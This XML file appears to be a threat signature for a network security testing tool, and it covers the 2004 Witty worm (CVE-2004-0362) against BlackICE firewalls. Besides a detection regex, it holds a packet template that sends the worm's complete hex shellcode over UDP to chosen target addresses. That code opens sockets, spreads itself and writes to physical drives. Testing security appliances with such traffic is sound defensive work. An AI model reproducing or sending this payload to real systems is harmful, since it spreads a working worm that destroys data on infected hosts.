<?xml version="1.0" encoding="utf-8"?>
<threatSignature>
  <ThreatProperties>
    <ExecDesc display="true" value="Witty Worm"/>
    <EngDesc display="true" value="This threat is a copy of the Witty worm, which infected hosts using BlackICE firewalls in 2004.  It causes instability and sends out copies of itself at a rapid rate."/>
    <Intent display="true">
      <item value="Infection"/>
    </Intent>
    <Protocol display="true" value="ICQ"/>
    <Type_Of_Equipment display="true">
      <item value="Firewall"/>
    </Type_Of_Equipment>
    <Known_Vendors_Affected display="true">
      <item value="Internet_Security_Systems"/>
    </Known_Vendors_Affected>
    <Known_Products_Affected display="true">
      <item value="BlackICE_Server_Protection"/>
    </Known_Products_Affected>
    <Known_Versions_Affected display="true">
      <item value="BlackICE_Server_Protection_3.6_ccf"/>
    </Known_Versions_Affected>
    <Credit display="true" value="http://www.netsecure.shawbiz.ca/witty-analysis.html"/>
    <CVEID display="true" value="CVE-2004-0362"/>
    <bugtraqID display="true" value="9913"/>
    <OSVDB display="true" value="4355"/>
    <Author display="true" value="Chuck McAuley"/>
    <ID display="true" value="000000ff4651479000a900fe009b00c913b2fe1b"/>
    <Revision display="true" value="1"/>
    <Safe display="true" value=""/>
    <SoftwareRevision display="true" value="1.4"/>
    <Suite display="true" value="Standard"/>
    <RunOnce display="false" value="false"/>
    <Valid_Traffic display="false" value=""/>
    <AccessVector display="false" value="remote"/>
    <AccessComplexity display="false" value="low"/>
    <Authentication display="false" value="not-required"/>
    <ConfImpact display="false" value="complete"/>
    <IntegImpact display="false" value="complete"/>
    <AvailImpact display="false" value="complete"/>
    <ImpactBias display="false" value="normal"/>
    <FirstAdded display="false" value=""/>
    <LastModified display="false" value="632742244528437500"/>
    <SigStyle display="false" value="Matching"/>
    <targetNode display="false" value="A"/>
    <SigProtocol display="false" value="UDP"/>
    <Rate display="false" value="1"/>
    <Regex display="false" value="\X05\X00\X00\X00\X00\X00\X00\X12\X02\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X02\X2C\X00\X05\X00\X00\X00\X00\X00\X00\X6E\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X01\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X41\X02\X05\X00\X00\X00\X00\X00\X00\XDE\X03\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X01\X00\X00\X01\X00\X00\X01\X00\X00\X1E\X02\X20\X20\X20\X20\X20\X20\X20\X28\X5E\X2E\X5E\X29\X20\X20\X20\X20\X20\X20\X69\X6E\X73\X65\X72\X74\X20\X77\X69\X74\X74\X79\X20\X6D\X65\X73\X73\X61\X67\X65\X20\X68\X65\X72\X65\X2E\X20\X20\X20\X20\X20\X20\X28\X5E\X2E\X5E\X29\X20\X20\X20\X20\X20\X20\X20\X89\XE7\X8B\X7F\X14\X83\XC7\X08\X81\XC4\XE8\XFD\XFF\XFF\X31\XC9\X66\XB9\X33\X32\X51\X68\X77\X73\X32\X5F\X54\X3E\XFF\X15\X9C\X40\X0D\X5E\X89\XC3\X31\XC9\X66\XB9\X65\X74\X51\X68\X73\X6F\X63\X6B\X54\X53\X3E\XFF\X15\X98\X40\X0D\X5E\X6A\X11\X6A\X02\X6A\X02\XFF\XD0\X89\XC6\X31\XC9\X51\X68\X62\X69\X6E\X64\X54\X53\X3E\XFF\X15\X98\X40\X0D\X5E\X31\XC9\X51\X51\X51\X81\XE9\XFE\XFF\XF0\X5F\X51\X89\XE1\X6A\X10\X51\X56\XFF\XD0\X31\XC9\X66\XB9\X74\X6F\X51\X68\X73\X65\X6E\X64\X54\X53\X3E\XFF\X15\X98\X40\X0D\X5E\X89\XC3\X83\XC4\X3C\X31\XC9\X51\X68\X65\X6C\X33\X32\X68\X6B\X65\X72\X6E\X54\X3E\XFF\X15\X9C\X40\X0D\X5E\X31\XC9\X51\X68\X6F\X75\X6E\X74\X68\X69\X63\X6B\X43\X68\X47\X65\X74\X54\X54\X50\X3E\XFF\X15\X98\X40\X0D\X5E\XFF\XD0\X89\XC5\X83\XC4\X1C\X31\XC9\X81\XE9\XE0\XB1\XFF\XFF\X51\X31\XC0\X2D\X03\XBC\XFC\XFF\XF7\XE5\X2D\X3D\X61\XD9\XFF\X89\XC1\X31\XC0\X2D\X03\XBC\XFC\XFF\XF7\XE1\X2D\X3D\X61\XD9\XFF\X89\XC5\X31\XD2\X52\X52\XC1\XE9\X10\X66\X89\XC8\X50\X31\XC0\X2D\X03\XBC\XFC\XFF\XF7\XE5\X2D\X3D\X61\XD9\XFF\X89\XC5\X30\XE4\XB0\X02\X50\X89\XE0\X6A\X10\X50\X31\XC0\X50\X2D\X03\XBC\XFC\XFF\XF7\XE5\X2D\X3D\X61\XD9\XFF\X89\XC5\XC1\XE8\X17\X80\XC4\X03\X50\X57\X56\XFF\XD3\X83\XC4\X10\X59\XE2\X98\X31\XC0\X2D\X03\XBC\XFC\XFF\XF7\XE5\X2D\X3D\X61\XD9\XFF\X89\XC5\XC1\XE8\X10\X80\XE4\X07\X80\XCC\X30\XB0\X45\X50\X68\X44\X52\X49\X56\X68\X49\X43\X41\X4C\X68\X50\X48\X59\X53\X68\X5C\X5C\X2E"/>
    <Created value="1139462554" display="false"/>
    <ServerSideAttack display="false" value="false"/>
  </ThreatProperties>
  <Variables>
    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="Z"/>
  </Variables>
  <Loops>
    <for index="A">
      <for index="B"/>
      <for index="C"/>
      <for index="D"/>
      <for index="E"/>
    </for>
  </Loops>
  <Output index="A" Count="">
    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="@random(0,FFFF)" FragmentOffset="0" TTL="30" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
        <UDP srcPort="4000" destPort="$destPort" checksum="" length="" Payload="050000000000001202000000000000000000000000022C00050000000000006E000000000000000000000000000000000001000000000000000000000000000000000000410205000000000000DE030000000000000000000000000000000100000100000100001E0220202020202020285E2E5E29202020202020696E73657274207769747479206D65737361676520686572652E202020202020285E2E5E292020202020202089E78B7F1483C70881C4E8FDFFFF31C966B9333251687773325F543EFF159C400D5E89C331C966B965745168736F636B54533EFF1598400D5E6A116A026A02FFD089C631C9516862696E6454533EFF1598400D5E31C951515181E9FEFFF05F5189E16A105156FFD031C966B9746F516873656E6454533EFF1598400D5E89C383C43C31C95168656C3332686B65726E543EFF159C400D5E31C951686F756E746869636B43684765745454503EFF1598400D5EFFD089C583C41C31C981E9E0B1FFFF5131C02D03BCFCFFF7E52D3D61D9FF89C131C02D03BCFCFFF7E12D3D61D9FF89C531D25252C1E9106689C85031C02D03BCFCFFF7E52D3D61D9FF89C530E4B0025089E06A105031C0502D03BCFCFFF7E52D3D61D9FF89C5C1E81780C403505756FFD383C41059E29831C02D03BCFCFFF7E52D3D61D9FF89C5C1E81080E40780CC30B045506844524956684943414C6850485953685C5C2E5C89E031C951B220C1E218526A03516A03D1E252503EFF15DC400D5E83C41431C981E9E0B1FFFF3DFFFFFFFF0F8437FFFFFF5689C631C050502D03BCFCFFF7E52D3D61D9FF89C5D1E86689C850563EFF15C4400D5E31C95189E25152B580D1E151B15EC1E11851563EFF1594400D5E563EFF1538400D5E5E5EE9ACFEFFFF6376075EE921FEFFFF0043666A76636C623431505135306A48315063345051555948783774654F7A5453545954654C4D410D0A446C443352376C56744243756B6B68647A2B32766F753033416335574F526B75717267644B7275315A494F436C53522F78514F694B6F36487A4A75675272493473374F6B534B7750714C75340D0A3562614E62523067504E595040003406B66240445219928E0442674162414630454441415741414141414141414141313833223E0A2020202020800100004600000046000000800000000200000066CC5B40C1720200000000000E58CE94080020CF2A0108004500003800010000FE01752ACAF3EA088C9906040303DE2B000000004500034946D300006F11BA378C990604CAF3EA080FA0F02003351BDB9B454A1FCBF33CCA50107FFFD906000069676E3D2263656E7465722280000000A0040000A0040000E00400000200000066CC5B40C1720200202000000E58CE9400E01833FF2C080045000492F87300008011EE2ECAF3EA4369CF30B20FA017C7047E5136050000000000001202000000000000000000000000022C00050000000000006E0000000000000000000000000000000000010000000000000000"/>
      </IP>
    </Ethernet>
  </Output>
</threatSignature>
